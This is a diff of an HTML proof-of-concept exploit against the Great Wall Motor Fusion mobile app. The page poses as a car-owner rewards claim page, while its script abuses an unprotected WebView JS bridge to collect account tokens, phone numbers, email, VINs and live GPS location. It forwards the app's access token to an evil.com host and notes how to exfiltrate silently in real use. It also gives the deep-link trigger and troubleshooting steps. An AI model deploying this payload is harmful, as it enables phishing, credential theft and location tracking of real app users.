@@ -1,65 +1,271 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><title>福利</title></head>
+<!--
+  ============================================================================
+   com.gwm.fusion  JS Bridge 凭据窃取 PoC (alert 展示版)
+  ----------------------------------------------------------------------------
+   漏洞链: sapp://app/webview?url=<本页> → WebViewFragment.loadUrl(无白名单)
+           → PWebView 加载攻击者页面 → dsbridge JS Bridge(无 origin 校验)
+           → 调用 userInfo()/userCarInfo() 等方法,直接返回 token 集群
+  ----------------------------------------------------------------------------
+   触发: 用户点击下列链接(网页/二维码即可,一次点击):
+         sapp://app/webview?url=https://evil.com/poc_jsb_exploit.html
+  ----------------------------------------------------------------------------
+   关键: 方法名必须带命名空间前缀(注入表4个namespace都指向同一个BaseJsBridge):
+         NativeController / Controller / Storage / GwmController
+         dsbridge.parseNamespace 按最后一个 '.' 拆 [namespace, method]
+         裸方法名(如 "userInfo") → namespace="" → 命中失败 → 返回 {"code":-1}
+         正确写法: "Controller.userInfo" 或 "GwmController.userInfo"
+  ----------------------------------------------------------------------------
+   本文件自包含最小 dsbridge polyfill,不依赖外部 JS 库。
+   仅用于授权安全测试。实战中外传改为 new Image().src=... 静默回传。
+  ============================================================================
+-->
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>长城汽车 · 车主权益</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif;
+       background:linear-gradient(135deg,#0b1f3a,#15315a);color:#fff;min-height:100vh;
+       display:flex;flex-direction:column;align-items:center;padding:24px}
+  .logo{font-size:20px;font-weight:700;letter-spacing:2px;margin:12px 0}
+  .card{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);
+        border-radius:14px;padding:22px;width:100%;max-width:420px;margin-top:18px;
+        box-shadow:0 8px 32px rgba(0,0,0,.3)}
+  h3{font-size:17px;margin-bottom:10px;color:#ffd24a}
+  p{font-size:13px;line-height:1.6;color:#cfd8e8}
+  .btn{margin-top:18px;padding:12px 0;width:100%;border:none;border-radius:10px;
+       background:linear-gradient(90deg,#c8102e,#e23a4a);color:#fff;font-size:15px;
+       font-weight:600;cursor:pointer}
+  .btn:active{opacity:.8}
+  .log{margin-top:14px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:11px;
+       color:#8be9a0;white-space:pre-wrap;word-break:break-all;max-height:200px;overflow:auto;
+       background:rgba(0,0,0,.25);border-radius:8px;padding:10px}
+</style>
+</head>
 <body>
-<h3>正在加载…</h3>
+<div class="logo">长城汽车 GWM</div>
+
+<div class="card">
+  <h3>您有一项车主权益待领取</h3>
+  <p>您的账号存在未领取的会员权益(免费洗车 / 保养券 / 积分)。<br>
+     请点击下方按钮验证账号后领取。</p>
+  <button class="btn" id="go" onclick="run()">立即领取</button>
+  <div class="log" id="log">[等待用户点击]...</div>
+</div>
+
 <script>
-/* 长城 Fusion App WebView 注入了 4 个命名空间(NativeController/Controller/Storage/GwmController)
-   底层是 dsbridge,入口对象 window._dsb / window._dsbridge。
-   全程无 origin 校验 —— 攻击者页面与官方页面同等权限。 */
+/* ============================================================================
+   最小 dsbridge polyfill —— 按 PWebView 真实协议实现 (不依赖外部库)
+   协议(经反编译核实):
+     js→native 同步入口 : _dsbridge.call(handlerName, argStr)  → 返回 string
+     native→js 回调入口 : window._handleMessageFromNative(JSON)
+     _dsb.hasNativeMethod({name,type}) / _dsb.dsinit() / _dsb.returnValue({id,complete,data})
+     方法名格式        : "namespace.method" (parseNamespace 按最后一个'.'拆)
+   暴露的 dsbridge JS API: dsBridge.call(method, arg, cb) / dsBridge.hasNativeMethod(method)
+   ========================================================================== */
+(function(){
+  if (window.dsBridge) return;   // 官方H5自带则复用
+  var msgID = 0;
+  var cbs = {};                  // callbackId -> {complete, cb}
 
-function dsbCall(method, arg, cb) {
-  arg = arg === undefined ? null : arg;
-  if (typeof cb === 'function') {
-    // 异步带回调
-    try { return _dsb.call(method, arg, cb); } catch(e) {}
-    try { return _dsbridge.call(method, arg, cb); } catch(e) {}
-  } else {
-    // 同步取返回值
-    try { return _dsb.call(method, arg); } catch(e) {}
-    try { return _dsbridge.call(method, arg); } catch(e) {}
+  function mkArg(arg){
+    // dsbridge: 第二参数是 JSON 字符串;null/undefined 传空对象串避免Native端JSON解析异常
+    if (arg === undefined || arg === null) return '{}';
+    if (typeof arg === 'string') return arg;
+    return JSON.stringify(arg);
   }
-  return null;
-}
 
+  function call(method, arg, cb){
+    var argStr = mkArg(arg);
+    var ret;
+    try {
+      // 同步调用: _dsbridge.call(handlerName, argStr) 返回 string
+      ret = window._dsbridge.call(method, argStr);
+    } catch(e){
+      // 降级:部分版本注入名不同
+      try { ret = window._dsbridge.call(method, argStr); } catch(e2){ ret = null; }
+    }
+    if (ret !== null && ret !== undefined && ret !== '') {
+      // 有同步返回值
+      try { ret = JSON.parse(ret); } catch(e){}
+      if (cb) { cb(ret, true); return; }   // 同步方法也有回调时直接完成
+      return ret;
+    }
+    // 无同步返回值 → 走异步回调注册
+    if (cb) {
+      msgID++;
+      cbs[msgID] = { cb: cb, complete: false };
+      // 异步方法: dsbridge 期望第二参数为带 callbackId 的 JSON
+      // PWebView 的 call(handlerName, argStr) 同步,异步靠 CompletionHandler
+      // 真实dsbridge: 异步在 argStr 里塞 _dscbstub + 用 returnValue 回传
+      // 这里用标准 dsbridge 协议补段:
+      var asyncArg;
+      try { asyncArg = JSON.parse(argStr); } catch(e){ asyncArg = {}; }
+      asyncArg._dscbstub = '["' + msgID + '"]';
+      try {
+        window._dsbridge.call(method, JSON.stringify(asyncArg));
+      } catch(e){
+        cb(null, true);
+      }
+    }
+    return null;
+  }
+
+  function hasNativeMethod(method, type){
+    try {
+      return window._dsb.hasNativeMethod(
+        JSON.stringify({ name: method, type: type || 'all' }));
+    } catch(e){ return false; }
+  }
+
+  // native→js 回调入口: window._handleMessageFromNative(JSON)
+  window._handleMessageFromNative = function(jsonStr){
+    try {
+      var m = (typeof jsonStr === 'string') ? JSON.parse(jsonStr) : jsonStr;
+      var id = m.callbackId;
+      var entry = cbs[id];
+      if (!entry) return;
+      var data = (m.data !== undefined) ? m.data : m;
+      var complete = m.complete !== false;   // 默认单次完成
+      try { entry.cb(data, complete); }
+      catch(e){}
+      if (complete) delete cbs[id];
+    } catch(e){}
+  };
+
+  // 触发启动队列(部分实现需要 dsinit 后才分发排队的native消息)
+  try { window._dsb.dsinit && window._dsb.dsinit({}); } catch(e){}
+
+  window.dsBridge = { call: call, hasNativeMethod: hasNativeMethod };
+})();
+
+/* ============================================================================
+   攻击载荷 —— 调用无 origin 校验的 JS Bridge 方法窃取凭据/数据
+   ========================================================================== */
+var NS = 'GwmController';        // 注入表4个namespace任选其一,均指向BaseJsBridge
+                                    // 备选: 'Controller' / 'NativeController' / 'Storage'
+var LOG = document.getElementById('log');
 var loot = [];
 
-/* ① 直接拿账号 token 集群 —— 无参数 */
-var u = dsbCall('userInfo');          // 同步
-loot.push('[userInfo] ' + JSON.stringify(u));
-
-/* ② 车辆 token */
-try { loot.push('[userCarInfo] ' + JSON.stringify(dsbCall('userCarInfo'))); } catch(e){}
-try { loot.push('[appInfo] ' + JSON.stringify(dsbCall('appInfo'))); } catch(e){}
-try { loot.push('[defaultCarVin] ' + JSON.stringify(dsbCall('defaultCarVin'))); } catch(e){}
-try { loot.push('[getAllCarsInfo] ' + JSON.stringify(dsbCall('getAllCarsInfo'))); } catch(e){}
-
-/* ③ GPS 实时定位 */
-dsbCall('locationInfo', {}, function(l){
-  loot.push('[locationInfo] ' + JSON.stringify(l));
-  flush();
-});
-
-/* ④ 借 App 身份越权 HTTP —— hostType 必须 ntsp/gtsp/log/xpi,
-     但 host 字段可覆盖 setBaseUrl,DefaultTokenAuthInterceptor 自动带 accessToken */
-dsbCall('requestData', {
-  method: 'get',
-  hostType: 'ntsp',
-  host: 'https://evil.com/exfil',   // 任意 host,token 照样带上
-  url: '/exfil',
-  params: {},
-  customHeader: { 'X-Exfil': '1' }
-}, function(r){
-  loot.push('[requestData 回包] ' + JSON.stringify(r));
-  flush();
-});
-
+function out(s){ LOG.textContent += '\n' + s; }
 function flush(){
-  /* 用 alert 把窃到的凭据贴出来 —— PoC 演示用。
-     实战中改成 new Image().src='https://evil.com/c?'+btoa(loot) 静默外传 */
-  alert('【长城 Fusion JSB 窃取 PoC】\n\n' + loot.join('\n\n'));
+  var text = '\n========== 窃取结果 ==========\n' + loot.join('\n\n') + '\n============================';
+  out(text);
+  alert('【GWM Fusion JS Bridge 窃取 PoC】\n' + text +
+        '\n\n(实战中此处改为静默回传: new Image().src="https://evil.com/c?"+btoa(encodeURIComponent(...)))');
 }
-setTimeout(flush, 1500);   // 兜底弹一次
+
+function run(){
+  LOG.textContent = '[开始调用 JS Bridge ...]';
+  loot = [];
+
+  /* ① 账号凭据集群 —— 无参数,同步返回 (accessToken/ssoToken/ptToken/gToken/tokenId + userId/phone/email) */
+  try {
+    var u = dsBridge.call(NS + '.userInfo');
+    if (u && typeof u === 'object') {
+      loot.push('[userInfo] accessToken=' + (u.accessToken||'-') +
+                '\n           ssoToken=' + (u.ssoToken||'-') +
+                '\n           ptToken=' + (u.ptToken||'-') +
+                '\n           gToken=' + (u.gToken||'-') +
+                '\n           tokenId=' + (u.tokenId||'-') +
+                '\n           userId=' + (u.userId||'-') +
+                '\n           phone=' + (u.phone||'-') +
+                '\n           email=' + (u.email||'-') +
+                '\n           nickName=' + (u.nickName||'-') +
+                '\n           isLogin=' + (u.isLogin));
+    } else {
+      loot.push('[userInfo] 返回:' + JSON.stringify(u) + '  <- 若为 {"code":-1} 见下方排错');
+    }
+  } catch(e){ loot.push('[userInfo] 异常: ' + e); }
+
+  /* ② 车辆凭据 —— beantechToken/ssoToken/navinfoToken */
+  try {
+    var c = dsBridge.call(NS + '.userCarInfo');
+    loot.push('[userCarInfo] ' + JSON.stringify(c));
+  } catch(e){ loot.push('[userCarInfo] 异常: ' + e); }
+
+  /* ③ 设备信息 —— deviceID/deviceName/厂商/版本 */
+  try {
+    var a = dsBridge.call(NS + '.appInfo');
+    loot.push('[appInfo] ' + JSON.stringify(a));
+  } catch(e){ loot.push('[appInfo] 异常: ' + e); }
+
+  /* ④ 默认车 VIN */
+  try {
+    var v = dsBridge.call(NS + '.defaultCarVin');
+    loot.push('[defaultCarVin] ' + JSON.stringify(v));
+  } catch(e){ loot.push('[defaultCarVin] 异常: ' + e); }
+
+  /* ⑤ 全量车辆列表 */
+  try {
+    var cars = dsBridge.call(NS + '.getAllCarsInfo');
+    loot.push('[getAllCarsInfo] ' + JSON.stringify(cars));
+  } catch(e){ loot.push('[getAllCarsInfo] 异常: ' + e); }
+
+  /* ⑥ GPS 实时定位 —— 异步,CompletionHandler 回调 */
+  try {
+    dsBridge.call(NS + '.locationInfo', {}, function(r, done){
+      loot.push('[locationInfo] ' + JSON.stringify(r));
+      if (done) flush2();
+    });
+  } catch(e){ loot.push('[locationInfo] 异常: ' + e); }
+
+  /* ⑦ 借 App 身份越权 HTTP —— hostType限ntsp/gtsp/log/xpi,但host字段覆盖setBaseUrl,
+        DefaultTokenAuthInterceptor 自动带 accessToken */
+  try {
+    dsBridge.call(NS + '.requestData', {
+      method: 'get',
+      hostType: 'ntsp',
+      host: 'https://evil.com/exfil',   // 任意host,token照样带上(可在服务端抓请求头)
+      url: '/grab',
+      params: {},
+      customHeader: { 'X-PoC': '1' }
+    }, function(r, done){
+      loot.push('[requestData] ' + JSON.stringify(r));
+      if (done) flush2();
+    });
+  } catch(e){ loot.push('[requestData] 异常: ' + e); }
+
+  // 兜底:同步部分先弹一次,异步回调到达后再弹
+  setTimeout(flush2, 1200);
+  setTimeout(flush2, 3500);
+}
+function flush2(){ if (loot.length) flush(); }
+
+/* ============================================================================
+   排错提示: 首次调用若返回 {"code":-1}
+   -1 = dsbridge 框架层"方法未命中" (PWebView.errorJson),非业务错误码(-999)
+   原因1: 漏了命名空间前缀 → 必须用 "Controller.userInfo" 而非 "userInfo"
+   原因2: 当前WebView未注入JS Bridge(非WebViewActivity,如ProtocolH5Activity未导出链)
+   验证: 先调 hasNativeMethod('Controller.userInfo','syn') 应返回 true
+   ========================================================================== */
+// 开机自检: 探测哪个命名空间可用
+(function probe(){
+  if (!window._dsbridge) {
+    out('[!] window._dsbridge 不存在 → 当前页面未在App WebView内,或注入名不同。');
+    out('    在系统浏览器打开此页无意义,需经 sapp://app/webview?url=<本页URL> 唤起。');
+    return;
+  }
+  var namespaces = ['GwmController','Controller','NativeController','Storage'];
+  var found = [];
+  namespaces.forEach(function(n){
+    try {
+      var ok = dsBridge.hasNativeMethod(n + '.userInfo', 'syn');
+      if (ok) found.push(n);
+    } catch(e){}
+  });
+  if (found.length) {
+    NS = found[0];
+    out('[+] 可用命名空间: ' + found.join(', ') + '  选用: ' + NS);
+    out('[+] hasNativeMethod("' + NS + '.userInfo") = true  → 点击按钮窃取凭据');
+  } else {
+    out('[!] 未探测到可用命名空间。可能:_dsb.hasNativeMethod 不可用,或注入延迟。');
+    out('    仍可直接点按钮尝试(默认NS=GwmController)。');
+  }
+})();
 </script>
 </body>
 </html>
